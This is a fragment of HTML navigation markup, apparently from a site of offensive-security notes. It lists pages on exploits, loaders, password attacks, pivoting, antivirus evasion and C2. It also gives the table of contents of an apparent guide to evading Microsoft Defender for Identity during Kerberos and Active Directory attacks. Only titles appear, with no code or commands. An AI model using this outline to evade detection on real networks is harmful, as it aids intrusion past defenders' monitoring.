+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Exploits/Buffer%20Overflow.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Buffer Overflow
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Exploits/Metasploit.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Metasploit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Exploits/Recherche%20d%27exploit.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Recherche d'exploit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Games
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Games
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Games/D2.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Loader
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Loader
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Loader/Chiffrement.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chiffrement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Loader/CrystalPalace.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CrystalPalace
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Loader/PandaLoader.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PandaLoader
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Loader/Process%20Injection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Process Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Loader/ShellCodePack.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ShellCodePack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Loader/Stager.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Stager
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Misc
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Misc
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/Audit%20de%20code%20source.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Audit de code source
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/AzureHound.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AzureHound
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/Data%20Exfiltration.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Exfiltration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/Edition%20Vid%C3%A9o.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Edition Vidéo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/GOAD.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GOAD
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/Notes.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Notes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/Wi-Fi.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wi-Fi
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+        
+          
+          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mobile
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_12">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Mobile
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Mobile/Rootage%20%26%20CA.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rootage &amp; CA
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Mobile/Test%20d%27instrusion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Test d'instrusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSCP
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_13">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    OSCP
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSCP/Active%20Directory%20Methodology.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory Methodology
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSCP/Flags.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Flags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSCP/Initial%20Access.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSCP/M%C3%A9thodologie.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Méthodologie
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSCP/Standalone%20Machine%20Methodology.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Standalone Machine Methodology
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
+        
+          
+          <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSINT
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_14">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    OSINT
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSINT/DNS.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSINT/Emails.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Emails
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
+        
+          
+          <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PasswordAttacks
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_15">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    PasswordAttacks
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/Bruteforce.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bruteforce
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/Hashcat%20Rules.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hashcat Rules
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/Hashcat.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hashcat
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/John.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    John
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/NTLM.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTLM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/Offline%20Password%20Cracking.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Offline Password Cracking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/Ressources.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ressources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/TMUX.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TMUX
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/Wordlists.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wordlists
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_16" >
+        
+          
+          <label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pivoting
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_16_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_16">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Pivoting
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pivoting/DNS%20Tunneling.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS Tunneling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pivoting/HTTP%20Tunneling.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HTTP Tunneling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pivoting/Ligolo.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ligolo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pivoting/Pivoting%20checklist.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pivoting checklist
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pivoting/Port%20Forwarding.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Port Forwarding
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pivoting/Tunnel%20SSH.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tunnel SSH
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_17" >
+        
+          
+          <label class="md-nav__link" for="__nav_17" id="__nav_17_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PrivilegeEscalation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_17_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_17">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    PrivilegeEscalation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PrivilegeEscalation/Linux.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PrivilegeEscalation/Windows.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RedTeam
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_18">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    RedTeam
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="AdaptixC2.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AdaptixC2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Antivirus%20Evasion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Antivirus Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="C2%20Redirector.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C2 Redirector
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Coerce%20%26%20Relay%20tunneling.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Coerce &amp; Relay tunneling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Composants%20de%20s%C3%A9curit%C3%A9%20Windows.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Composants de sécurité Windows
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MDI
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="MDI.html" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MDI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#microsoft-defender-for-identity-opsec-guide" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Microsoft Defender for Identity - OPSEC Guide
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Microsoft Defender for Identity - OPSEC Guide">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#table-of-contents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Table of Contents
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Overview">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#kerberos-flow-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberos Flow Reference
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#detect-mdi-presence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detect MDI Presence
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reconnaissance-opsec" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reconnaissance OPSEC
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance OPSEC">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound-ldap-sharphound" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BloodHound - LDAP (SharpHound)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#adexplorer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ADExplorer
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound-adws" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BloodHound - ADWS
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="BloodHound - ADWS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#soaphound" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SOAPHound
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shadowhound-adm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ShadowHound-ADM
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kerberos-requests-opsec" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberos Requests OPSEC
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Kerberos Requests OPSEC">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#as-req" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AS-REQ
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AS-REQ">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#emulate-a-genuine-as-req" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Emulate a Genuine AS-REQ
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tgs-req" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TGS-REQ
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="TGS-REQ">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#emulate-a-genuine-tgs-req" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Emulate a Genuine TGS-REQ
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#s4u2self" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        S4U2Self
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="S4U2Self">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#emulate-a-genuine-s4u2self-tgs-req" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Emulate a Genuine S4U2Self TGS-REQ
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#s4u2proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        S4U2Proxy
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="S4U2Proxy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#emulate-a-genuine-s4u2proxy-tgs-req" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Emulate a Genuine S4U2Proxy TGS-REQ
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kerberoasting-opsec" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberoasting OPSEC
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Kerberoasting OPSEC">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mdi-detections" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MDI Detections
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opsec-approach" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OPSEC Approach
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#targeted-kerberoasting-genericwrite" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Targeted Kerberoasting (GenericWrite)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identity-attack-paths" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Identity Attack Paths
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Identity Attack Paths">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#entra-connect-interactive-logon" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Entra Connect Interactive Logon
+      
